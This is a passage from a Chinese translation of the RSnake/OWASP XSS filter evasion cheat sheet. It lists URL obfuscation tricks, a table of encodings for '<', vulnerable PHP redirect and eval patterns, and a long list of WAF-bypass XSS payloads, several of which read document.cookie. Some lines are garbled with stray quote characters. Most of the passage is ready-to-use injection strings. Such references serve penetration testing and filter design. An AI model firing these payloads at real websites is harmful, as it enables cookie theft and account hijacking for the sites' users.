这是用了一个仅在 Firefox 上有效的小技巧，因为他实现了"feeling lucky"功能。不像下面一个例子，这个在 Opera 上无效因为 Opera 会认为这个是一个老式的 HTTP 基础认证钓鱼攻击，但它并不是。他只是一个异常的 URL，如果你点击了对话框确定，它就可以生效。但是在 Opera 上会是一个错误错误对话框，所以认为其不被 Opera 所支持，同样在 Firefox 2.0 后不再有效。

```html
<a href="http://ha.ckers.org@google">XSS</a>
```

#### 2.82.11. Google 的"feeling lucky" part 3

这是一个异常的 URL，只作用于 Firefox 以及 Opera，因为他们实现了"feeling lucky"功能.像上面的例子一样，他要求你的攻击页面在 Google 上特定关键词排名第一(在这个示例里关键词是"google")

```html
<a href="http://google:ha.ckers.org">XSS</a>
```

#### 2.82.12. 移除别名

当结合上面的 URL，移除"www."会节约 4 个字节，总共为正确设置的服务器节省 9 字节:

```html
<a href="http://google.com/">XSS</a>
```

#### 2.82.13. 绝对 DNS 后额外的点

```html
<a href="http://www.google.com./">XSS</a>
```

#### 2.82.14. JavaScript link location

```html
<a href="javascript:document.location='http://www.google.com/'">XSS</a>
```

#### 2.82.15 内容替换作为攻击向量

```html
<a href="http://www.google.com/ogle.com/">XSS</a>
```

#### 2.83. 字符转义表

下面是 HTML 和 JavaScript 中字符"<"所有可能的组合。其中大部分不会被渲染出来，但是其中许多可以在某些特定情况下呈现。

```
<
%3C
&lt
&lt;
&LT
&LT;
&#60
&#060
&#0060
&#00060
&#000060
&#0000060
&#60;
&#060;
&#0060;
&#00060;
&#000060;
&#0000060;
&#x3c
&#x03c
&#x003c
&#x0003c
&#x00003c
&#x000003c
&#x3c;
&#x03c;
&#x003c;
&#x0003c;
&#x00003c;
&#x000003c;
&#X3c
&#X03c
&#X003c
&#X0003c
&#X00003c
&#X000003c
&#X3c;
&#X03c;
&#X003c;
&#X0003c;
&#X00003c;
&#X000003c;
&#x3C
&#x03C
&#x003C
&#x0003C
&#x00003C
&#x000003C
&#x3C;
&#x03C;
&#x003C;
&#x0003C;
&#x00003C;
&#x000003C;
&#X3C
&#X03C
&#X003C
&#X0003C
&#X00003C
&#X000003C
&#X3C;
&#X03C;
&#X003C;
&#X0003C;
&#X00003C;
&#X000003C;
\x3c
\x3C
\u003c
\u003C
```

### 3. 绕过 WAF(Web Application Firewall)的方法 - 跨站脚本

通用问题

- 存储型 XSS

如果攻击者已经让 XSS 绕过过滤器，WAF 将无法阻止攻击透过。

- 基于 Javascript 的反射型 XSS

```
实例: <script> ... setTimeout(\"writetitle()\",$_GET[xss]) ... </script>
利用: /?xss=500); alert(document.cookie);//
```

- 基于 DOM 的 XSS

```
实例: <script> ... eval($_GET[xss]); ... </script>
利用: /?xss=document.cookie
```

#### 通过请求重定向构造 XSS

- 存在漏洞代码

```
 ...
 header('Location: '.$_GET['param']);
 ...
```

同样包括：

```
...
 header('Refresh: 0; URL='.$_GET['param']);
 ...
```

- 这种请求不会绕过 WAF

```
 /?param=javascript:alert(document.cookie)
```

- 这种请求可以绕过 WAF 并且 XSS 攻击可以在某些浏览器执行：

```
 /?param=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

#### WAF 绕过字符串

```html
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<Video> <source onerror = "javascript: alert (XSS)">
<Input value = "XSS" type = text>
<applet code="javascript:confirm(document.cookie);">
<isindex x="javascript:" onmouseover="alert(XSS)">
"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
"><img src="x:x" onerror="alert(XSS)">
"><iframe src="javascript:alert(XSS)">
<object data="javascript:alert(XSS)">
<isindex type=image src=1 onerror=alert(XSS)>
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert(1)">X
</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
<style>//*{x:expression(alert(/xss/))}//<style></style> 
On Mouse Over​
<img src="/" =_=" title="onerror='prompt(1)'">
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<form><button formaction=javascript&colon;alert(1)>CLICKME
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> 
```

#### 3.1 Alert 混淆以绕过过滤器

```
(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
top[‘al\145rt’](1)
top[‘al\x65rt’](1)
top[8680439..toString(30)](1)
```

### 4. 作者和主要编辑

Robert "RSnake" Hansen

### 5. 贡献者

Adam Lange
Mishra Dhiraj
